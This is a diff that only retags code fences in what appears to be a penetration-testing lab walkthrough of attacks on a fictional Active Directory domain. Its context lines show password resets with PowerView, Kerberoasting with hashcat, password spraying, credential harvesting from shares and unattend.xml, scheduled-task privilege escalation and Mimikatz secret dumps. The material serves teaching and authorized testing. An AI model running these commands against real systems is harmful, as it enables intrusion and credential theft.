@@ -10,8 +10,7 @@ The `Active Directory Enumeration & Attacks` module demonstrates various ways to
 
 We'll use the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) collector to enumerate all possible AD objects and then ingest the data into the BloodHound GUI for review. We can download the executable (though in a real-world assessment, it's best to compile our own tools) and use the handy DNN file manager to upload it to the target. We want to gather as much data as possible and don't have to worry about evasion, so we'll use the `-c All` flag to use all collection methods.
 
-```
-        cmd
+```bat
 c:\DotNetNuke\Portals\0> SharpHound.exe -c All
 
 2022-06-22T10:02:32.2363320-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
@@ -42,8 +41,7 @@ As an aside, we can see that all Domain Users have RDP access over the DEV01 hos
 
 We can use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) to change the `ssmalls` user's password. Let's RDP to the target after checking to ensure the port is open. RDP will make it easier for us to interact with the domain via a PowerShell console, though we could still do this via our reverse shell access.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -61,22 +59,19 @@ Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
 
 To achieve this, we can use another SSH port forwarding command, this type `Local Port Forwarding`. The command allows us to pass all RDP traffic to `DEV01` through the `dmz01` host via local port 13389.
 
-```
-        shellsession
+```shellsession
 ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
 ```
 
 Once this port forward is set up, we can use `xfreerdp` to connect to the host using drive redirection to transfer files back and forth easily.
 
-```
-        shellsession
+```shellsession
 xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
 ```
 
 We notice that we only get console access as this server does not have the the Desktop Experience role installed, but all we need is a console. We can type `net use` to view the location of our redirected drive and then transfer the tool over.
 
-```
-        cmd
+```bat
 c:\DotNetNuke\Portals\0> net use
 
 New connections will be remembered.
@@ -93,8 +88,7 @@ c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
 
 Next, type `powershell` to drop into a PowerShell console, and we can use `PowerView` to change the `ssmalls` user's password as follows:
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
 
 PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose
@@ -105,8 +99,7 @@ VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
 
 We can switch back to our attack host and confirm that the password was changed successfully. Generally, we would want to avoid this type of activity during a penetration test, but if it's our only path, we should confirm with our client. Most will ask us to proceed so they can see how far the path will take us, but it's always best to ask. We want to, of course, note down any changes like this in our activity log so we can include them in an appendix of our report.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -128,8 +121,7 @@ Digging around the host and AD some more, we don't see much of anything useful. 
 
 First, let's run [Snaffler](https://github.com/SnaffCon/Snaffler) from our RDP session as the `hporter` user.
 
-```
-        cmd
+```bat
 c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
         1 file(s) copied.
 
@@ -150,8 +142,7 @@ Press any key to exit.
 
 This doesn't turn up anything interesting, so let's re-run our share enumeration as the `ssmalls` user. Users can often have different permissions, so share enumeration should be considered an iterative process. To avoid having to RDP again, we can use the `CrackMapExec` (`NetExec`) [spider\_plus](https://www.netexec.wiki/smb-protocol/spidering-shares) module to dig around.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -172,8 +163,7 @@ SPIDER_P... 172.16.8.3      445    DC01             [*]     OUTPUT: /tmp/cme_spi
 
 This creates a file for us in our `/tmp` directory so let's look through it.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat 172.16.8.3.json 
 {
     "Department Shares": {
@@ -195,8 +185,7 @@ hiimeins@htb[/htb]$ cat 172.16.8.3.json
 
 The file `SQL Express Backup.ps1` in the private IT share looks very interesting. Let's download it using `smbclient`. First, we need to connect.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -219,8 +208,7 @@ smb: \> ls
 
 Then we can browse to the `Development` share.
 
-```
-        shellsession
+```shellsession
 smb: \IT\Private\> cd Development\
 smb: \IT\Private\Development\> ls
   .                                   D        0  Wed Jun  1 14:34:17 2022
@@ -236,8 +224,7 @@ getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL 
 
 Checking out the file, we see that it's some sort of backup script with hardcoded credentials for the `backupadm`, another keyboard walk password. I'm noticing a trend in this organization. Perhaps the same admin set it as the one that set the password we brute-forced with `Hydra` earlier since this is related to development.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat SQL\ Express\ Backup.ps1 
 
 $serverName = ".\SQLExpress"
@@ -262,8 +249,7 @@ $server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)
 
 Before trying to use this account somewhere, let's dig around a bit more. There is an interesting .vbs file on the SYSVOL share, which is accessible to all Domain Users.
 
-```
-        shellsession
+```shellsession
      },
        "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
            "atime_epoch": "2022-06-01 14:34:41",
@@ -274,8 +260,7 @@ Before trying to use this account somewhere, let's dig around a bit more. There 
 
 We can download it once again with `smbclient`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -299,8 +284,7 @@ getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as adum.vbs (57
 
 Digging through the script we find another set of credentials: `account:L337^p@$$w0rD`
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat adum.vbs 
 
 Option Explicit
@@ -329,8 +313,7 @@ Checking in BloodHound, we do not find an `account` user, so this may just be an
 
 To cover all our bases, let's check if there are any Kerberoastable users. We can do this via Proxychains using `GetUserSPNs.py` or `PowerView`. In our RDP session, we'll load PowerView and enumerate Service Principal Name (SPN) accounts.
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
 PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname
 
@@ -353,8 +336,7 @@ vmwarescvc
 
 There are quite a few. Let's export these to a CSV file for offline processing.
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 
 VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
@@ -364,8 +346,7 @@ VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccou
 
 We can download this file via the RDP drive redirection we set up earlier: `copy .\ilfreight_spns.csv \\Tsclient\Home`. Open up the .csv file using LibreOffice Calc or Excel and pull out the hashes and add them to a file. We can now run them through Hashcat to see if we can crack any and, if so, if they are for privileged accounts.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
@@ -383,8 +364,7 @@ One hash cracks, but checking in BloodHound, the account does not seem to be hel
 
 Another lateral movement technique worth exploring is Password Spraying. We can use [DomainPasswordSpray.ps1](https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1) or the Windows version of Kerbrute from the DEV01 host or use Kerbrute from our attack host via Proxychains (all worth playing around with).
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1
 
 [*] Current domain is compatible with Fine-Grained Password Policy.
@@ -410,8 +390,7 @@ We find a valid password for two more users, but neither has interesting access.
 
 Let's try a few more things to cover all our bases. We can search the SYSVOL share for `Registry.xml` files that may contain passwords for users configured with autologon via Group Policy.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -429,8 +408,7 @@ GPP_AUTO... 172.16.8.3      445    DC01             [*] Searching for Registry.x
 
 This doesn't turn up anything useful. Moving on, we can search for passwords in user `Description` fields in AD, which is not overly common, but we still see it from time to time (I have even seen Domain and Enterprise Admin account passwords here!).
 
-```
-        powershell
+```powershell
 PS C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
 
 samaccountname description
@@ -449,8 +427,7 @@ We find one for the account `frontdesk,` but this one isn't useful either. It's 
 
 At this point, we have dug into the domain pretty heavily and have found several sets of credentials but hit a bit of a brick wall. Going back to the basics, we can run a scan to see if any hosts have WinRM enabled and attempt to connect with each set of credentials.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -470,8 +447,7 @@ The host `172.16.8.50`, or `MS01` is the only one left that we haven't gotten in
 
 It works, and we're in!
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -494,8 +470,7 @@ At this point, we could use this evil-winrm shell to further enumerate the domai
 
 Back to the task at hand. Our user is not a local admin, and `whoami /priv` does not turn up any useful privileges. Looking through the `Windows Privilege Escalation` module, we don't find much interesting so let's hunt for credentials. After some digging around, we find an `unattend.xml` file leftover from a previous installation.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\Users\backupadm\desktop> cd c:\panther
 
 |S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
@@ -511,8 +486,7 @@ Mode                LastWriteTime         Length Name
 
 Let's check to see if it contains any passwords, as they sometimes do.
 
-```
-        shellsession
+```shellsession
 
 *Evil-WinRM* PS C:\panther> type unattend.xml
 
@@ -554,8 +528,7 @@ Let's check to see if it contains any passwords, as they sometimes do.
 
 We find credentials for the local user `ilfserveradm`, with the password `Sys26Admin`.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\panther> net user ilfserveradm
 
 User name                    ilfserveradm
@@ -600,8 +573,7 @@ First, create a file called `pwn.bat` in `C:\Users\ilfserveradm\Documents` conta
 
 Finally, to trigger the task, create a new .txt file in the `C:\Users\ilfserveradm\Documents` directory. We can check and see that the `ilfserveradm` user was added to the `Administrators` group.
 
-```
-        cmd
+```bat
 C:\Users\ilfserveradm> net localgroup administrators
 
 Alias name     administrators
@@ -622,8 +594,7 @@ The command completed successfully.
 
 Next, we'll perform some post-exploitation on the MS01 host. We do see a couple of interesting files in the root of the c:\ drive named `budget_data.xlsx` and `Inlanefreight.kdbx` that would be worth looking into and potentially reporting to the client if they are not in their intended location. Next, we can use Mimikatz, elevate to an `NT AUTHORITY\SYSTEM` token and dump LSA secrets.
 
-```
-        cmd
+```bat
 c:\Users\ilfserveradm\Documents> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
@@ -692,8 +663,7 @@ old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 f
 
 We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.
 
-```
-        powershell
+```powershell
 PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
 
 DefaultUserName : mssqladm
@@ -709,8 +679,7 @@ Now we have a new credential pair: `mssqladm:DBAilfreight1!`.
 
 Before we move on, let's check for any other credentials. We see Firefox installed, so we can grab the [LaZagne tool](https://github.com/AlessandroZ/LaZagne) to try to dump any credentials saved in the browser. No luck, but always worth a check.
 
-```
-        cmd
+```bat
 c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox
 
 |====================================================================|
@@ -734,8 +703,7 @@ elapsed time = 3.29700016975
 
 It's also worth running [Inveigh](https://github.com/Kevin-Robertson/Inveigh) once we have local admin on a host to see if we can obtain password hashes for any users.
 
-```
-        powershell
+```powershell
 PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
 PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
 
